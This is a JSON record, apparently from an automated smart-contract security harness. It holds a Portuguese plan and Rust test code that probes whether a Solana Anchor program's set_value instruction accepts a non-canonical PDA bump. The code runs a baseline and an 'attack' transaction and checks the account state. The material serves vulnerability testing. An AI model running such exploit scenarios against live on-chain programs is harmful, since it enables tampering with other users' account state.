attempts.raw:
{
  "plan": "Preparar uma conta DataAccount existente no endereco do PDA canonico derivado de [b"data", user, bump_canonico] e um usuario signer. O baseline chama set_value com o bump canonico e o PDA canonico, provando que o cenario esta correto. O ataque chama set_value com um bump nao canonico e uma conta no endereco correspondente a esse bump nao canonico, tentando fazer o programa aceitar um PDA nao canonico. O efeito mede se a conta nao canonica foi aceita e teve seu campo bump alterado para o bump nao canonico.",
  "scenario": "let user = Pubkey::new_unique();
let (canonical_pda, canonical_bump) = Pubkey::find_program_address(&[b"data", user.as_ref()], &env.program_id);

let mut non_canonical_bump = canonical_bump - 1;
let non_canonical_pda = loop {
    match Pubkey::create_program_address(&[b"data", user.as_ref(), &[non_canonical_bump]], &env.program_id) {
        Ok(pk) => break pk,
        Err(_) => {
            if non_canonical_bump == 0 {
                break Pubkey::new_unique();
            }
            non_canonical_bump -= 1;
        }
    }
};

let data_account = account(
    &env.program_id,
    &anchor_account_data("DataAccount", &(user, 0u64, canonical_bump)),
    None,
);

let user_account = wallet(1_000_000_000);

let baseline_ix = env.anchor_ix(
    "set_value",
    &(canonical_bump, 42u64),
    vec![
        AccountMeta::new(canonical_pda, false),
        AccountMeta::new_readonly(user, true),
    ],
);

let baseline_accounts = vec![
    (canonical_pda, data_account.clone()),
    (user, user_account.clone()),
];

let baseline_result = env.baseline("set_value com bump canonico", &baseline_ix, &baseline_accounts);

let attack_ix = env.anchor_ix(
    "set_value",
    &(non_canonical_bump, 99u64),
    vec![
        AccountMeta::new(non_canonical_pda, false),
        AccountMeta::new_readonly(user, true),
    ],
);

let attack_accounts = vec![
    (non_canonical_pda, data_account),
    (user, user_account),
];

let attack_result = env.attack("set_value com bump nao canonico", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    let data = after(&attack_result, &non_canonical_pda).data();
    env.effect(
        "conta com endereco nao canonico aceita e bump alterado",
        read_u64(data, 40) == 99u64 && data[48] == non_canonical_bump,
    );
}"
}

